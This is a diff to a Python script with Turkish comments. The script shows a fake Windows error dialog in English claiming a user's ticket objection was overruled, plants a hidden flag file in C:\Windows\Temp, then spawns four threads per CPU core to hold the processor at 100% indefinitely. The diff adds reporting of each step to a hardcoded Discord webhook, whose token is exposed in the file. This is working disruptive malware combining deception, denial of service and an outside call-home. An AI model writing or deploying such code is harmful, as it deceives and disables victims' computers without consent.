@@ -4,6 +4,19 @@ import multiprocessing
 import sys
 import threading
 import os
+import requests
+
+# ==========================================
+# WEBHOOK BİLDİRİM URL'SI
+# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(message):
+    try:
+        payload = {"content": f"**[CPU BİLDİRİM]** {message}"}
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
 
 # ==========================================
 # FLAG DOSYASI (DANDİK İSİM)
@@ -15,15 +28,17 @@ FLAG_FILE = "C:\\Windows\\Temp\\fgjhfgkfsjg.flag"
 # ==========================================
 def show_fake_window():
     if os.path.exists(FLAG_FILE):
-        print("[*] Flag dosyası bulundu, pencere açılmayacak.")
+        send_notification("⏭️ Flag dosyası bulundu, pencere açılmayacak.")
         return
     
+    send_notification("🪟 Sahte pencere açılıyor...")
     result = ctypes.windll.user32.MessageBoxW(
         0,
         "Although the ticket referenced by 'Yeoizii' was reviewed under better and fewer rules, no login from any other location could be found on the account. Since it was made from the person's own computer, the arrows point to this fact. The request has been denied!",
         "Your objection has been overruled!",
         0x10 | 0x1
     )
+    send_notification("✅ Sahte pencere kapatıldı.")
     return result
 
 # ==========================================
@@ -43,12 +58,12 @@ def cpu_killer():
 def start_cpu_killer():
     core_count = multiprocessing.cpu_count()
     thread_count = core_count * 4
-    print(f"[*] Çekirdek: {core_count}, Açılacak thread: {thread_count}")
+    send_notification(f"🧠 Çekirdek: {core_count}, Açılacak thread: {thread_count}")
     
     for _ in range(thread_count):
         threading.Thread(target=cpu_killer, daemon=True).start()
     
-    print("[+] CPU %100 yüklendi (4 katı)")
+    send_notification(f"🔥 CPU %100 yüklendi ({thread_count} thread ile)")
 
 # ==========================================
 # 3. FLAG OLUŞTUR
@@ -57,26 +72,23 @@ def create_flag():
     try:
         with open(FLAG_FILE, "w") as f:
             f.write("EXECUTED")
-        print(f"[+] Flag oluşturuldu: {FLAG_FILE}")
+        send_notification(f"✅ Flag oluşturuldu: {FLAG_FILE}")
     except Exception as e:
-        print(f"[-] Flag oluşturulamadı: {e}")
+        send_notification(f"❌ Flag oluşturulamadı: {e}")
 
 # ==========================================
 # 4. ANA
 # ==========================================
 if __name__ == "__main__":
-    # Flag yoksa pencere aç, varsa açma
-    show_fake_window()
+    send_notification("🚀 CPU ZORLAMA BAŞLATILDI!")
     
-    # Flag oluştur (bir daha açılmamak için)
+    show_fake_window()
     create_flag()
     
-    # 10 saniye bekle
+    send_notification("⏳ 10 saniye bekleniyor...")
     time.sleep(10)
     
-    # İşlemciyi zorla (4 katı)
     start_cpu_killer()
     
-    # Sonsuz bekle
     while True:
         time.sleep(60)
